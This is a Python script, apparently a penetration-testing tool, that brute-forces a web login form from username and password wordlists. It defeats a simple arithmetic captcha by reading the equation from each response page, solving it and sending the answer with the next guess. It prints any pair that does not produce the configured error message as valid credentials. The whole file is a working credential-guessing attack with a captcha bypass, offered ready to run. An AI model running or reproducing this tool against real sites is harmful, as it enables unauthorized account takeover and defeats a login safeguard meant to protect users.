try:
 import requests
 import argparse
except:
 print("Error: requests and argparse are needed for this script to work")
 quit()

### 
print("###################################################")
print("#######  #####  ###    #      ##  ##  #############")
print("####### # ### # ### ## ###  ####      #############")
print("####### ## # ## ###    ###  ####  ##  #############")
print("####### ### ### ### ## ###  ####  ##  #############")
print("###################################################")
print("#######     ##     ##     #########################")
print("####### ######  ## ## ### #########################")
print("####### ######     ##     #########################")
print("#######     ##  ## ## #############################")
print("###################################################")
print("#######    # ### ##    ##     ##    ##    #########")
print("####### ## ## # ### ## ## ### ## ##### ############")
print("#######    ### ####    ##     ##    ##    #########")
print("####### ## ### #### ##### ### ##### ##### #########")
print("#######    ### #### ##### ### ##    ##    #########")
print("###################################################")
print("Author: cy-baz")
###

# Arguments for the script
parser = argparse.ArgumentParser(description='Bruteforcer.')
parser.add_argument('-l',dest='url', help="URL to send login request to")
parser.add_argument('-u',dest='user', help="Wordlist of users to use",default="usernames.txt")
parser.add_argument('-p',dest='password', help="Wordlist of passwords to use", default="passwords.txt")
parser.add_argument('-e',dest='error', help="Error to use as a benchmark", default="Invalid ")
parser.add_argument('-up',dest='userParam', help="Name of username parameter",default="username")
parser.add_argument('-pp',dest='passParam', help="Name of password parameter",default="password")
parser.add_argument('-cp',dest='captchaParam', help="Name of capture parameter",default="captcha")
parser.add_argument('-m',dest='matchEq', help="String to match after/before the equation is specified. This string should only occur once in the response.",default="= ?")
parser.add_argument('-off',dest='offChange',type=int, default=12, help="Number of characters to look at prior to the matchEq string for the equation")
parser.add_argument('-d',dest='direction', default="before", help="Decides if the offset should be before or after the specified string")
args = parser.parse_args()


# Making argparse arguments easier to reference
url = args.url
user = args.user
passwords = args.password
error = args.error
direction = args.direction

# URL Parameter check
if not url:
 print("Error: Url not provided. Use the -l parameter to specify a url")
 quit()
elif "http://" not in url and "https://" not in url:
 print("Error: URL needs http:// or https:// at the beginning")
 quit()

if direction != 'before' and direction != 'after':
  print("Error: direction parameter should be 'before' or 'after'")
  quit()
 
## Parameters for URL
userParam = args.userParam
passParam = args.passParam
captchaParam = args.captchaParam

## Arguments for finding and using the captcha equation
matchEq = args.matchEq
offChange = args.offChange

# Function to perform the arithmetic
def arithmetic(p):
 # The location the captcha is found, based on the "= ?" being how it is identified
 offset = (p.text.find(matchEq))
 if direction == 'before':
  # Finding the equation before the "= ?", this might need tweaking based on the application/
  math = (p.text[offset-offChange:offset])
 elif direction == 'after':
  ## If you find the equation after some string, use the following instead
   math = (p.text[offset:offset+offChange])
 
 # Splitting the equation into 3 parts (2 numbers and an operator)
 try:
  msplit = (math.split())
  firstNum = int(msplit[0])
  secondNum = int(msplit[2])
  operator = msplit[1]

 # Calculating the captcha
  if operator == '+':
   result = (firstNum + secondNum)
  elif operator == '-':
   result = (firstNum - secondNum)
  elif operator == '/':
   result =(firstNum / secondNum)
  elif operator == '*':
   result = (firstNum * secondNum)
  return result

 except:
  print("")

# Defining what goes in the payload (Unless more/less parameters are needed, this doesn't need to be changed)
def send(user,pw,result):
 if result == "FIRST": 
  payload = {
   userParam: user,
   passParam: pw,
   }

 else:
  payload = {
   userParam: user,
   passParam: pw,
   captchaParam: result
  }
 return(payload)

# First payload to send
payload = send('fakeUser','fakePassword',"FIRST")

# First request, to get the captcha calculation
with requests.Session() as s:
 p = s.post(url, data=payload)
 result = arithmetic(p)

##################################### END OF FIRST REQUEST

def brute_force(result):
 print("=== Brute forcing credentials while attempting to bypass captcha ===")
 # Cycle through usernames and passwords
 with open(user) as user_file:
  print("- - - Cycling through users - - -")
  for username in user_file:
   username=username.strip()
   print("\nCurrent user: " + username)
   with open(passwords) as pass_file:
    for password in pass_file:
     password=password.strip()

     # The payload to send (as defined in the send() function
     payload = send(username, password,result)

     with requests.Session() as s:
      p = s.post(url, data=payload)
      result = arithmetic(p)

      if error not in p.text and "does not exist" not in p.text:
       print ("+++ valid credentials: " + username + ":" + password)
       print (p.text) # Print the page response



if __name__ =="__main__":
 brute_force(result)
